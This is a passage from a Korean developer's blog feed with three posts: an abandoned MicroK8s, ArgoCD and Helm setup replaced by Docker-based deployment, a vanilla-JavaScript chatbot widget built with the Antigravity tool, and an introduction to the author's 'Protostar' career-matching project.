<p>처음에 살짝 해매긴 했지만(<code class="language-plaintext highlighter-rouge">--classic</code> 옵션 넣고 설치해야함), 나름 순차적으로 진행이 되었으며  GitHub 을 기반으로 <code class="language-plaintext highlighter-rouge">단일진실공급원(Single Source of Truth, SSOT)</code> ArgoCD 를 통해 확실하게 기반을 다져나갔다.</p>

<p>ArgoCD</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 1. 'argocd'라는 네임스페이스(공간) 생성</span>
<span class="nb">sudo </span>microk8s kubectl create namespace argocd

<span class="c"># 2. ArgoCD 공식 설치 YAML 적용</span>
<span class="nb">sudo </span>microk8s kubectl apply <span class="nt">-n</span> argocd <span class="nt">-f</span> https://raw.githubusercontent.com/argoproj/argo-cd/stable/manifests/install.yaml
</code></pre></div></div>

<p>ArgoCD 접속 가능하도록 임시 설정하기</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># A5 서버의 8080 포트를 ArgoCD 서버(argocd-server)의 443 포트로 연결</span>
<span class="c"># 0.0.0.0 추가로 외부에서 접속 가능하게함</span>
<span class="nb">sudo </span>microk8s kubectl port-forward <span class="nt">--address</span> 0.0.0.0 svc/argocd-server <span class="nt">-n</span> argocd 8080:443
</code></pre></div></div>

<p><img src="/assets/images/posts/2025-12/20251205-002.png" alt="" /></p>

<p>ArgoCD 를 기반으로 하게 된 이유는 간단하다. 우선 핵심 인프라의 설정과정에서 국내에서 다소 표준처럼 쓰이고 있다는 사실을 알 수 있었다. 또한 써보면서 알게된 거지만 당연하게도 GitOps에 최적화된 다양한 설정들이 존재했다.</p>

<p>원래 같으면 1) 개발자가 직접 명령어를 쳐서 구현하던가, 2) Jenkins / Github Action 기반의 배포 스크립트를 구축하는게 방법이겠지만 이하 내용 때문에 ArgoCD 를 써야 한다고 확신했다.</p>

<ol>
  <li>CI 와 CD 의 분리 : Jenkins 로 배포를 만들다보면, CICD 의 의존성, 복잡성이 증가하는 것을 경험할 수 있다.  하지만 ArgoCD 는 CD 부분을 담당하여, 3분마다 동기화를 해주고, 지정된 상태에 따라 기본적인 오케스트레이션을 해주며, 특히 단순하게 특정 어플리케이션만을 위한 형태가 아니라, 각 ‘개별’ 어플리케이션의 상태와 관계 없이 바라보게 해준다. 이러한 점은 (1) Jenkins 가 배포와 관련된 영역에 대한 책임에서 해방되면서, Jenkins 의 관리 영역이 획기적으로 줄어들게 되고, 순수하게 CI에만 집중하면 되게 된다. (2) Jenkins 가 접근을 외부에서 내부로 하게 되다보니 생길 보안의 이슈가 원천적으로 차단되고, ArgoCD 가 직접 Git Repo를 Pull 하는 방식이니, 외부 접속과 관련된 보안 틈을 만들지 않는다. (3) 클러스터로의 통로를 담당하는 키, 환경변수 등 모든 것들이 외부에 있을 필요가 없다. ArgoCD 가 내부에서 쥐고 있다.</li>
  <li>설정 표류 감지 및 자동 복구 : Jenkins 의 배포를 자동화 하는 경우도 있을 것이고, 수동으로 할 때도 있다. 둘다 문제가 있다. 수동으로 하면 적절하게 진행하기가 안되거나, 관리 인원이 여럿이 되는 순간 꼬일 수 있는 일이 발생한다. 또 자동으로 되어 있다면, 누군가 급하게 무언가 수정했다고 칠 때, 그 내용은 Jenkins 는 알 수 없다. 그리고 그 상황에서 배포가 이루어지면 시스템의 마비를 초래할 수도 있으며, 무엇보다 구성원들의 협업에서 맥락의 단절이 발생한다. 하지만 SSOT(단일 진실 공급원)에 충실한 ArgoCD 기반의 배포는 매우 훌륭하게 이 문제를 해결한다. 모든 것, 즉, 롤백도, 코드의 변경 등 모든 변화의 대응은 Git 의 레포지터리가 담당하고, 그 과정에서 어떤 정책으로 할 지만 잘 결정하면 어떠한 이슈 없이도 대응이 가능하다.</li>
</ol>

<p>이러한 점들 때문에 <code class="language-plaintext highlighter-rouge">project-protostar-k8s-config</code>라는 단일 레포를 만들고, 여기에서 메인 서버와 모니터링 서버 별로 자원 배포 및 서버 구동을 위한 infrastructure 들을 구성해보았다. 특히 여기서 적극 도입해본 것이 Helm Chart 의 패키징 방식이었다.</p>

<h4 id="helm-chart의-위험성">Helm Chart의 위험성(?)</h4>

<p>여기서부터가 문제의 시작점.
Helm Chart 는 도커의 이미지에 비하여, 애플리케이션 배포의 실전성을 추가해주는 방식의 도구였다. k8s 에서 애플리케이션을 배포할 때, 특히 실무에서 필요한 여러 설정들이 있고, 특히 failure 를 고려한 이중, 삼중의 시스템 패키징이 되어 있는걸 손쉽게 다운 받을 수 있다- 이 점 때문에 필요하고, 또 실제로 그걸 기반으로 Monitoring 서버 구축, Loki 나 Promtail, Grafana의 설정은 핵심이었기에 룰루랄라 설정을 이어갔다…하지만…</p>

<p>우선 Helm을 운용하는데 문법이 상당히 복잡했다. 뿐만 아니라 가장 핵심은 ‘욕심이 과했다’ 라고 이해하는게 핵심이다. 버전이 어떻게 호환되고, 또 어떤 식으로 써야 할지도 모른체 구축되는 수많은 어플리케이션의 연쇄는 핸들링을 하는 과정에서 제대로 연결이 안되는 온갖 문제들을 야기했다.</p>

<p><img src="/assets/images/posts/2025-12/20251205-007.png" alt="" /></p>

<blockquote>
  <p>현재 단일 서비스를 위해 올라간 모든 컨테이너(물론 지금은 Docker 로만 되어 있고, k8s 를 걷어내긴 했다.)</p>
</blockquote>

<p>그리고 거기서 가장 극심한 것은 역시나 버전 차이 및 호환성 문제.
단순히 어플리케이션 자체만 래핑하는 거였다면 문제가 훨씬 쉬웠을 것이다. 하지만 ArgoCD 기반에, 각종 에러를 대응하기 위해 Helm Chart 패키징한 어플리케이션이란 내가 설정하는 메인 설정이 아니더라도 뒤에서 안전하게 돌아갈 수 있는 설정을을 하게 되어 있고, 그러다보니 유명한 패키지로 열려 있는 것들을 불러오게되면, 이 내부에도 또 버전들이 낮게 설정되어 있거나, 자신들의 테스트한 버전들이 들어 있고, 이걸 래핑한 걸 또 내가 쓰는 입장이니, 호환성 문제는 매우 예민했다.</p>

<p>만났던 여러 문제들을 정리하면 다음과 같은 문제가 있었다.</p>

<ol>
  <li>Zalando PostgreSQL Operator 와 PgVector 구축 시 이미지 레지스트리 : 과거 사용되던 것들을 찾아서 기재했으나, 알고 봤더니 기존과 다른 위치에서 배포되고 있었음. AI 도 이상한 소리함. 찾아보니 새로운 곳에서 지원을 했고, 더욱 문제는 pgVector 설정은 별도로 해줘야 하는 것이었음.</li>
  <li>Vector 데이터베이스 구축 시 사용될 yaml 내부의 문자열 문법에러 : AI 를 기반으로 반 바이브 + 학습 방식으로 진행함. 그런데 여기서 실제 필요한 문법 형식과 다르게 학습된 AI 는 이상한 소리를 했고, 이것이 문제일 것이란 점을 한참 지나서 파악하게됨(…)</li>
  <li>꼬인 리소스 기준으로 좀비 리소스가 된 상태에서의 해결 안됨 : k8s API의 통제권을 ArgoCD 에게 위임하고, finalizer 역시 ArgoCD 로 지정했음. 그러나 여기서 호환성 문제, 특히 Grafana 스택에서 loki 가 있었는데, 문제는 모니터링 서버에 별도로 Grfana를 설치하면서 k8s 의 Grafana 공식 스택과 별도였는데, 이때 Docker 버전 차이, Grafana 버전 차이에 따라 loki의 문법을 제대로 못찾으면서 호환성 이슈가 생김 알게됨. 커넥션 불량이 발생하면 finalizer는 멈추고, 좀비처럼 변해서 ArgoCD 의 통제 명령에 제대로 동작하지 않음. 그 밖에도 MinIO 설정이 필요한 Loki 내부 설정에서의 문제점(최신버전 과 구버전 사이) 등 여러 이슈가 동시 다발로 묶여서 발생함.</li>
  <li>Ingress Nginx 대신 Gateway API 사용 실패 : 지금은 조금더 이해하긴 했지만, 최근 Ingress Nginx 라는 매우 쉽고 편리한 방식에서 API Gateway 를 사용해야 하고 Nginx Fabric 이라는 걸 도입해보려 했으나 에러 발생.</li>
  <li>Snap 기반의 문제: 사용하기 편리하고, 경량이며, 격리된 특성을 가진 snap을 처음 쓸때는 대단히 ‘개발자 친화적’인 도구라고 생각했다. 하지만 여러 문제를 가진 다는 것을 알게 되었을 때는 실제 환경에선 이걸 잘 못쓰면 안된는구나라는 판단이 섰다.
    <ol>
      <li>우선 가장 문제로 <code class="language-plaintext highlighter-rouge">--classic</code> 모드로 설정하지 않으면 설치 되더라도 일반적인 호스트 시스템에 접근이 불가능하다.</li>
      <li>또한 Snap 특성상 자동 업데이트를 강제하는데, 이게 개인용 도구라면야 업데이트를 하는게 큰 문제는 아닐 수 있지만, MicroK8s 를 사용하게 되면 이건 심각한 문제가 될 수 밖에 없다고 느꼈다. (물론 이 문제는 오래된 거라, 요즘은 대안이 있지만 ‘번거롭다’는게 흠.)</li>
      <li>그 밖에도 여러모로 번거로운 부분들이 있었고, 결론적으로 실제 상용으로 쓸 때 MicroK8s 기반이 되는 것 자체는 괜찮았지만, snap 을 쓰는건 절대 하지 말아야겠단 생각이 더욱 명확해질 수 있었다. 개발로 구축한 이후의 서비스에 Snap의 궁합은 대단히 조심스러워야 할 것이었다.</li>
    </ol>
  </li>
</ol>

<p>그리하여 얻은 결론은
확실한 검증, 그리고 동시에 확실한 호환되는 툴들을 버전별로 꿰고 있어야 하며, 더욱이 패키지 방식으로 묶인 걸 먼저 쓰는게 아닌 스스로 설정해보는 것을 써보거나, 아예 해당 패키징 된 것을 쓸 거라면 완전히 그것의 의존성에 기대어 개별적인 환경이나, 내 커스텀한 상황으로 만들면 안된다는 사실(…) 이해할 수 있었다.</p>

<p>현재는 K8S 의 기본적인 골조와 구성부터 다시 학습을 하고 있으며, 프로젝트의 진행 그리고 구현할 것들을 감안했을 때는 멈출 수 없다는 전제 하에, 기존의 Jenkins + Nginx + Docker + GitHub 기반의 무중단 배포 방식으로 설정을 진행하였다.</p>

<h4 id="향후-계획">향후 계획</h4>

<p><img src="/assets/images/posts/2025-12/20251205-003.png" alt="" /></p>

<p><img src="/assets/images/posts/2025-12/20251205-006.png" alt="" /></p>

<p>그리하여 돌고 돌았지만 깨달은 점은</p>

<ol>
  <li>k8s 는 생각 이상으로 별게 맞았다.(?) k8s 자체를 이해하는건 이번 일로 깨달았지만, 문제는 사실 그 안에 채우는 것들이었다.</li>
  <li>기본기를 배울 좋은 기회였고, 대규모 분산처리를 위해 하긴 할건데, 일단 만드려는 것부터 먼저하자(?)</li>
  <li>Docker 는 진짜 직관적인 것이었다.</li>
</ol>

<p>와 같았다. 그러나</p>

<p>목표를 위한 키워드 안에 다른 핵심들도 있었기에, 시간 낭비를 줄이고자 바로 노선을 변경. Docker 기반으로 컨테이너라이징 하는 것으로 수정하였으며, 패키지 방식은 좀더 연구를 통해 구성해보려고 한다. 물론, 가장 문제시 되는 호환성은 각 도구 별로 사용법 그 이상으로 이해도를 높이는 시간을 가지면 아마 무리없었지 않을까 싶긴 하다. 그러나, 어쨌든 당장은 목표를 위해 가야 하니 수정… 지금은 다음과 같은 구조로 설정하였다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Main 서버 
- nginx
- exporter
- cAdvisor 
- promtail
- Front-end Server(Green, Blue)
 -  NextJS 
- Back-end Server(Green, Blue)
 - NestJS
 - FastAPI
- PostgreSQL Vector (DB, RAG)
- Redis (Que, Messaging)

Sub 서버
- nginx 
- exporter
- cAdvisor
- prometheus
- Grafana
- Loki
- MinIO(Obj Storage)
</code></pre></div></div>

<p>또한 이를 위한 관리 구조는 다음 레포지터리로 구성했다.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- project-protostar-server-configs : monitoring 핵심 도구레포지터리, Nginx 등의 설정을 관리하는 SSOT로 보장
- project-mini-frontend : NextJS app 및 Jenkins 파일 관리 레포
- project-protostar-nest : NestJS, 서비스 기능 구현 서버
- project-protostar-fastapi : FastAPI 기반 AI 서비스 기능 구현 서버
</code></pre></div></div>

<p>또한 특징적으로 이러한 문제도 있었는데
KT 회선 하나 당 공인 IP 하나가 할당된다. 따라서 정식 서비스를 온프레미스로 진행시 종단간 암호화를 위해선 HTTPS 443 의 적절한 포트를 할당 해야했다.</p>

<p>그러나 여기서 문제는 Nginx 를 통해 443 포트를 점유하는 것까진 괜찮지만, 문제는 이 경우 어드민으로 관리하는 영역을 접속하는 것도 443 으로 암호화 및 외부 접속 가능하게 만들려면 메인 서버의 Nginx 를 경유하던지 해야 하는게 기본적인 해결책이었다. 그러나 이 경우 관리하는 도구들이 있는 서브 서버는 살아 있고, 메인 서버가 죽어버리는 일등이 발생할 때 문제가 심각해진다.</p>

<p>왜냐하면 443으로 메인 서버의 nginx 를 경유한 순간부터, 서버의 문제 발생 시 이에 대한 적절한 대응이 불가능한 것이다.</p>

<p>이에 L4(Transport Layer) 레벨의 프록시 패스, 앞 단에 무료 GCP 서버를 하나 추가한 뒤, 이를 공인 IP의 다른 포트로 전달. 단 이때 암호화된 패킷을 그대로 전달하기 때문에 암호화는 유지되면서도 하나의 공인 IP 기준으로 443 HTTPS 를 두 선으로 만드는 방법을 적용하여, 관리 회선과 서비스 회선의 분리를 만들어냈다. 그림으로 정리하면 이런 구조다</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 서비스 접속</span>
서비스 접속<span class="o">(</span>443<span class="o">)</span> -&gt; HTTPS -&gt; 공인 IP<span class="o">(</span>443<span class="o">)</span> -&gt; 메인 서버 <span class="o">(</span>443<span class="o">)</span> 
<span class="c"># 관리 </span>
관리 도구 접속<span class="o">(</span>443<span class="o">)</span> -&gt; GCP 가상 머신<span class="o">(</span>443<span class="o">)</span> -&gt; L4 proxy pass -&gt; 공인 IP <span class="o">(</span>다른 포트<span class="o">)</span> -&gt; 포트 포워딩 -&gt; 서브 서버<span class="o">(</span>443<span class="o">)</span> 
</code></pre></div></div>

<p>다행이 L4 레이어는 암호화를 해지하지 않는다. 단 외부 IP 를 정확히 인지하지 못하게 되고, GCP 가상 머신의 공개 IP 로 기록이 남는 문제는 있다. 이에 Nginx 에서 이러한 문제를 해결하기 위한 옵션을 켜는 것으로 관리 회선과 서비스 회선의 독립을 만들어냈다.</p>

<h4 id="바이브-ai-k8s-devops-그리고-protostar">바이브, AI, K8s, DevOps 그리고 Protostar</h4>

<p><img src="/assets/images/posts/2025-12/20251205-004.png" alt="" /></p>

<blockquote>
  <p>현재는 데모만 올라가 있다… 계속 개발중</p>
</blockquote>

<p>현재 Protostar 서비스는 계속 작업 중이다. 산넘어 산이라더니 K8s 를 적용하는 과정, MSA 폴리글랏 구조, 그리고 거기에 3년차 정도가 해야 하는 많은 도구들. 처음엔 별거 아니겠지(?) 란 생각, 그리고 AI 라는 강력한 도구로 할 수 있을 것 같았지만 이는 오만한 생각이었고, 화들짝 놀라며 방법을 수정. 지금에 이르렀다(…)</p>

<p>물론, 이젠 생각을 달리 하기로 했다. 서비스와 프로젝트의 구체적인 구성을 채우고, 이미지가 준비만 된다면 Git Ops로 옮기는 건 일도 아니었고, 다행이 시행착오 덕에 ArgoCD 기반으로 배포하는 것은 문제가 아님을 파악했고, 오히려 다른 도구들 S3 호환 MinIO 의 관리나, 기타 다른 도구들에 대한 이해도가 더 끌어올라와야 k8s 로 포팅도 쉽게 가능할 것이란 확신을 얻었다. 그러니 달리고 난 뒤에 다시 적용해보겠다. 달리자(…)</p>

<p><img src="/assets/images/posts/2025-12/20251205-005.png" alt="" /></p>

<blockquote>
  <p>우선 K8s 와 Message 큐 기능은 제외되었다.
향후 추가 예정…</p>
</blockquote>]]></content><author><name>Paul2021-R</name></author><category term="학습" /><category term="학습" /><category term="DevOps" /><category term="Docker" /><category term="MicroK8s" /><category term="Kubernetes" /><category term="AI" /><summary type="html"><![CDATA[K8s 실패 + Docker 환경으로의 전환 정리]]></summary></entry><entry><title type="html">TIL - Antigravity 기반으로 챗봇 데모 구성해보기</title><link href="http://0.0.0.0:4000/%EA%B0%9C%EB%B0%9C/2025/12/05/01-coding-with-antigravity.html" rel="alternate" type="text/html" title="TIL - Antigravity 기반으로 챗봇 데모 구성해보기" /><published>2025-12-05T00:00:00+00:00</published><updated>2025-12-05T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%EA%B0%9C%EB%B0%9C/2025/12/05/01-coding-with-antigravity</id><content type="html" xml:base="http://0.0.0.0:4000/%EA%B0%9C%EB%B0%9C/2025/12/05/01-coding-with-antigravity.html"><![CDATA[<h1 id="protostar-chatbot-demo-report">Protostar Chatbot Demo Report</h1>

<p><img src="/assets/images/project-protostar/protostar_icon.png" alt="" /></p>

<h2 id="1-개요-overview">1. 개요 (Overview)</h2>

<p>본 리포트는 블로그 내 ‘Protostar’ 챗봇 위젯의 개발 과정과 기술적 구현 사항을 정리한 것이다. Antigravity 를 기반으로 좀더 빠르게 구성 가능한지? 에 대한 질문과 Google 제시한 Implementation Plan - progress - walkthrough 의 라이프사이클에 따른 개발 방식을 제대로 이해하기 위한 실험적인 미니 프로젝트이다.</p>

<p>이 프로젝트는 단순한 정적 페이지용 위젯을 넘어, 향후 <strong>SSR(Server-Side Rendering) 서버 환경에서 호출될 컴포넌트</strong>임을 고려한 선행 기술 검증(PoC) 및 데모 작성 실험이며, AI 까지 붙일 생각을 했으나, 정적 사이트 및 AI 적용 시 생길 수 있는 이슈들로 인해 단순 채팅 기능의 FE 개발만을 진행해 보았다.</p>

<h2 id="2-기술적-구현-technical-implementation">2. 기술적 구현 (Technical Implementation)</h2>

<p>본 챗봇은 외부 라이브러리 의존성 없이 <strong>Vanilla JavaScript (ES6+)</strong> 만으로 구현되었으며, 이식성과 독립성을 최우선으로 설계되었다. 이러한 설계를 하게된 핵심은 아래를 고려했기 때문이다.</p>

<ol>
  <li>향후 제작할 Agentic AI 기반 챗봇이 어디든 연동되기 위해선 가장 중요한 키워드는 ‘호환성’이다.</li>
  <li>핵심 코어를 제외하곤 외부로 노출되어야 하기 때문에, 이를 고려한 설계가 가능해야하고, 그러기위핸 당장 종속성을 제거한 순수한 기술로 구현 가능한지 검증이 필요하다.</li>
</ol>

<p>그리하여 결론적으로 다음 성과를 달성했다.</p>

<p><img src="/assets/images/posts/2025-12/20251205-012.png" alt="" /></p>

<ul>
  <li><strong>독립적 실행 환경 (<code class="language-plaintext highlighter-rouge">assets/js/protostar.js</code>)</strong>:
    <ul>
      <li>HTML, CSS, Logic이 하나의 JS 파일에 캡슐화함.</li>
      <li><code class="language-plaintext highlighter-rouge">document.createElement</code>와 <code class="language-plaintext highlighter-rouge">appendChild</code>를 통해 DOM을 동적으로 생성함으로써, 어떤 페이지에도 <code class="language-plaintext highlighter-rouge">&lt;script&gt;</code> 태그 한 줄로 이식 가능함.</li>
      <li>CSS는 JS 내부에서 주입되어 스타일 충돌을 방지함.</li>
    </ul>
  </li>
  <li><strong>상태 관리 (State Management)</strong>:
    <ul>
      <li>브라우저의 <code class="language-plaintext highlighter-rouge">localStorage</code>를 미니 데이터베이스처럼 활용하여 세션 지속성을 1차적으로 구현함.</li>
      <li><code class="language-plaintext highlighter-rouge">protostar_sessions</code> 키를 통해 대화 히스토리, 생성 시간, URL 정보를 구조적으로 저장함.</li>
    </ul>
  </li>
</ul>

<h2 id="3-주요-기능-key-features">3. 주요 기능 (Key Features)</h2>

<ol>
  <li><strong>세션 관리 (Session Management)</strong>:
    <ul>
      <li>다중 세션 지원 (단, 현재 계획중인 프로젝트의 유저 사용 제한을 고려하여 일일 3회 생성 제한).</li>
      <li>생성된 지 7일이 지난 데이터 자동 삭제.</li>
      <li>세션 리스트 UI 및 슬라이드 애니메이션 적용.</li>
    </ul>
  </li>
  <li><strong>동적 컨텍스트 (Dynamic Context)</strong>:
    <ul>
      <li>사용자가 보고 있는 페이지의 URL을 기반으로 채팅방 제목이 동적으로 변경된다.</li>
      <li><code class="language-plaintext highlighter-rouge">+</code> 버튼을 통해 현재 페이지의 제목과 내용을 문맥(Context)으로 첨부할 수 있다.(특정 페이지에 대한 요약이나, 준비된 사항이 있다면 AI가 답변해주기 위하여)</li>
    </ul>
  </li>
  <li><strong>사용자 경험 (UX)</strong>:
    <ul>
      <li>커스텀 오버레이를 통한 직관적인 알림 (회원가입 유도 등).</li>
      <li>반응형 아이콘 리사이징 (PC/Tablet/Mobile 최적화).</li>
      <li>라인 아트 스타일의 유저 프로필 아이콘 및 직관적인 인터페이스.</li>
    </ul>
  </li>
</ol>

<h2 id="4-향후-계획-ssr-및-서버-연동-future-integration">4. 향후 계획: SSR 및 서버 연동 (Future Integration)</h2>

<p>현재는 클라이언트 사이드에서 모든 로직이 돌고 있지만, 최종 목표는 <strong>Next.js/React 기반의 SSR 서버</strong>로 이관하고, protostar 페이지에서 관리 될 예정이다. 단 한줄의 스크립트 호출 요청으로 어떤 블로그든 자신만의 기술블로그 및 커리어를 위한 AI 챗봇이 구축될 가능성을 확신하였다.</p>

<p>이번 데모를 통해 클라이언트단에서 필요한 이벤트 처리와 데이터 구조를 확립하였으며, 향후 다음과 같이 발전될 예정이다:</p>

<ul>
  <li><strong>Iframe/Script Injection</strong>: 외부 서버(Protostar 서비스)에서 위젯을 호스팅하고, 블로그는 이를 호출하는 구조.</li>
  <li><strong>실제 DB 연동</strong>: <code class="language-plaintext highlighter-rouge">localStorage</code> 대신 서버 DB(PostgreSQL 등)에 대화 내용을 저장.</li>
  <li><strong>AI 모델 연동</strong>: 현재의 목업(Mock) 응답 대신 실제 LLM API와 통신.</li>
</ul>

<h2 id="5-결론-그리고-antigravity">5. 결론 그리고 Antigravity</h2>

<p><img src="/assets/images/posts/2025-12/20251205-010.png" alt="" /></p>
<blockquote>
  <p>Antigravity 의 Implementation Plan</p>
</blockquote>

<p><img src="/assets/images/posts/2025-12/20251205-011.png" alt="" /></p>
<blockquote>
  <p>Antigravity 의 Walkthrough</p>
</blockquote>

<p>사실 여기서 더 소개를 하진 않겠지만 Antigravity 가 왜 괜찮은가? 라고 생각해볼때, 확실히 ‘UX’가 AI를 어떻게 이용할 것인가 라는 지점에서 완성도가 상당하다고 느껴지기 때문이라고 답할 수 있을 것 같다. 물론 workspace 도 대단하다고 느꼈지만, 순서를 구체화하고 AI 와의 협업, AI를 어떤 식으로 사람이 관리하도록 만들었는가? 차원에서 본다면 대단한 진보가 아닐 수 없었다.</p>

<p>업무의 성격에 따라, 구현의 목표치가 복잡하면 이에 맞춰 구현 플랜을 짜고, 다른 작업을 하고 있는 상황에서 AI의 이해 상황을 확인한다. 그리곤 수정을 할 게 있다면 수정을 진행하고, 그에 맞춰 진행 요청, 그리곤 결과물을 보게되는데, 이때 역시 테스트를 무엇을 얼마나 해야할지를 사람이 판단 가능하게 제시. 여기서 더 나아가면 subagent 기능으로 QA 까지 해보면 될것 같다. 진짜 DevOps 영역은 아직 한계가 명확하지만 웹 개발 영역은… 미친게 분명하단 생각이 든다.</p>

<p>또한 간단하게 순수 바닐라로 DOM 수정까지 포함하고 핵심 기능 전체를 구현하는데 AI 의 도움, 내 확인, 심지어 글 하나 별도로 작성 중이던 시점에서 1천줄의 코드를 작성하는데 약 1시간 반…. 엄청난 생산성 차이라는 건 명백해 보인다. 그러나 한 가지 확실히 알 수 있는 점은</p>

<ol>
  <li>개발 용어에 친숙하고 정확한 지침이 될 수록 기능 완성도는 명확하다.</li>
  <li>우선순위, 원칙을 명확하게 하지 않으면 AI 는 ‘과한 최선’을 다해 다소 꼬일 수 있다.</li>
  <li>반드시 AI 의 구현 작업 목록을 통해 AI의 확률적 판단이 ‘오해’ 인지 아닌지를 검토가 가히 필수이다.</li>
</ol>

<p>라는 점은 더욱 명확해지는 것 같다. 코더는 사라져도 찐 실력자들은 그대로 살아있을거란게 확실히 느껴진다.</p>

<p>더불어, 구현해보고 나니 Protostar 의 프로젝트가 생각 이상 편리할 것이란 생각. 그리고 이를 디테일하게 해주면 최소한 ‘뭘 원하는가’ 라는 차원에서 구직자 구인자 사이의 꽤나 괜찮은 접근이 되지 않을까? 라는 생각은 명료해진 것같다. 물론, 시장의 파워나 크기를 생각해보면 의미 없어 보이긴 하지만…음</p>]]></content><author><name>Paul2021-R</name></author><category term="개발" /><category term="개발" /><category term="VibeCoding" /><category term="Antigravity" /><category term="Frontend" /><summary type="html"><![CDATA[Protostar Chatbot Demo Report]]></summary></entry><entry><title type="html">Protostar 프로젝트를 소개합니다</title><link href="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/24/project-protostar.html" rel="alternate" type="text/html" title="Protostar 프로젝트를 소개합니다" /><published>2025-11-24T00:00:00+00:00</published><updated>2025-11-24T00:00:00+00:00</updated><id>http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/24/project-protostar</id><content type="html" xml:base="http://0.0.0.0:4000/%ED%95%99%EC%8A%B5/2025/11/24/project-protostar.html"><![CDATA[<h2 id="project-protostar-를-소개합니다">Project Protostar 를 소개합니다</h2>

<h3 id="forge-your-future">Forge Your Future</h3>
<p><img src="/assets/images/assets/protostar-icon.png" alt="" />
<img src="/assets/images/assets/protostar-demo.png" alt="" /></p>

<p>회사가 뭘 원할까?</p>

<p>이 질문은 회사를 다니는 경력자들조차 쉬이 확답으로 이야기 하기 어려운 영역이다. 전문성, 어떤 영역에서 깊이 있게 된 사람이라면 모를까, 그렇지 않다면 항상 어려운 이야기일 것이다.</p>

<p>이 사람은 과연 잘 할까?</p>

<p>이 질문 역시 HR을 하는 조직, 회사 입장에서 항상 어려운 영역이다. 전문성과 체계화를 통해 이를 시스템으로 정착 시킨 회사라면 그나마 괜찮겠지만, 그렇지 않은 회사들이 절대적이며, 그렇기에 많은 회사 경영진들은 비싼 돈을 주고서도 인사 관리, 어떻게 사람을 뽑고, 쓰며, 배치 할지에 돈과 시간을 쏟아붓는다.</p>

<p>그런 생각 도중에 이렇게 생각했다?</p>

<p>커리어에 대한 현실적인 질문을 노동자가 받을 수 있다면?
커리어에 대한 방대한 자료들에 직접 핵심으로 생각하는 질문을 하고, 그거에 능동적으로 답변이 가능하다면?</p>

<p>이력서는 압축이 필요하다
경력 기술서도 압축이 필요하다
자기 소개서도 압축이 필요하고 무엇보다 ‘매력적’인 부분을 어필해야한다.</p>

<p>HR 담당자의 시간은 금인데, 일일히 읽어보는게 아닌, 핵심으로 생각하는 질문을 던질 수 있고, 이에 준하는 사람을 능동적으로 찾아낼 수 있다면? 자연어로 구성된 복잡한 질문을 풀어낼 수 있다면?</p>

<p>또 반대로 HR 담당자가 어떤 질문을 하고, 어떤 부분을 관심 가지는지 알 수 있다면?</p>

<p>‘Forge Your Future’ 이라는 슬로건은 이러한 문제에서 시작하였다.</p>

<h3 id="기술적-성장-포인트">기술적 성장 포인트</h3>

<p>현재 3년간의 과정을 통해 나의 기술적 능력치는 상당히 끌어 올려졌다. 특히나 1년 간의 메인 백엔드 개발자로서의 일은, 물론 남들에겐 제대로된 사수가 없다는 사실에, 박봉이란 사실에 아쉬워 하거나, 저걸로 되겠냐? 라고 생각하고 질문하시는 분도 있었다.</p>

<p>하지만 그것은 나에겐 너무나 소중한 시간이었다. 온전한 책임, 온전한 집중이 가능하고, 다른 사람이 아닌 내가 실제 부딪혀서 생기는 불만과, 부족함, 그리고 어려움을 직접 고민해볼 수 있는 ‘권한’이 제공되었다는 점만으로도 감사했고, 그 감사한 순간에 하루가 다르게 성장하는 AI는. 비록 완벽하진 않지만, 그럼에도 불구하고 내가 써야할 다양한 기술들의 적용, 방법, 핵심을 잘 설명해주는 완벽한 비서였다.</p>

<p>그렇기에 1년하고도 수개월 간을 달려올 수 있었고, 그 달려옴으로 생긴 문제도 쉴 겸. 그리고 그걸 기반으로 더 큰 성장을 이루기 위해 이번 프로젝트를 기획하게 되었다. BM 차원에서나, 기획 차원에서 아쉬움도 있을 수 있고, 한계점이 명백하다고 생각은 한다. 그럼에도, 실제 구현을 해냈다. 그리고 동시에 이를 어떤 구조에서 세워 나갔는가! 를 더 중요시하기로 했기에, 몇가지 기술적 구현 목표를 설정했다.</p>

<ul>
  <li>v1 : 초기 MSA 기반 설계, Kubernetes 를 기반으로 하는 엔터프라이즈급 구성, 스케일링, 무중단(zero-downtime) 을 구축하는 걸 목표로 하고 AI와 DevOps 역량을 극대화 하자.</li>
  <li>v2 : 국내 시장의 요구사항을 점검하여 몇 가지 기술 스택을 개선하고, 특히 k8s 기반의 대중적인 툴인 ArgoCD 를 기반으로 CI/ CD의 영역의 책임 분리, Spring 을 기반으로 하는 기술 스택의 재 활용 등을 수행했다.</li>
  <li>v2.1 : 진행 과정에서 알게된 제약 사항, 특히 온프레미스에서 수행하게 되다보니 발생한 리소스 경합, 네트워크 문제를 해결하는 구조를 포함한다. 또한 단일 실패지점(SPOF) 에 대한 구조적 한계점을 인지하고, Admin과 Service 의 구조적 설계를 보강한다.</li>
</ul>

<p><img src="/assets/images/posts/2025-11/20251124-038.png" alt="" /></p>

<p>특히 이러한 아키텍트를 하게된 목표는 다음과 같은 기준 때문이다.</p>

<ol>
  <li>3년차 개발 직군의 역량을 갖춰 보자! : k8s, Grafana, Loki, RabbitMQ(혹은 kafka)</li>
  <li>현재의 표준화된 스케일링 도구들에 대한 이해도, 클라우드 플랫폼의 의존성을 탈피할 수단을 확실하게 배워 AWS, GCP, Azure 라는 굵직한 키워드 만큼이나, 기술 독립적인 역량을 갖추자</li>
  <li>AI를 서비스 개발, 서비스의 테스팅, 서비스 내부에 적극적으로 쏟아 넣어, 기계적으로 해결 어려운 문제를 해결하고, 생산성을 극대화 시키는 역량을 갖추자!</li>
</ol>

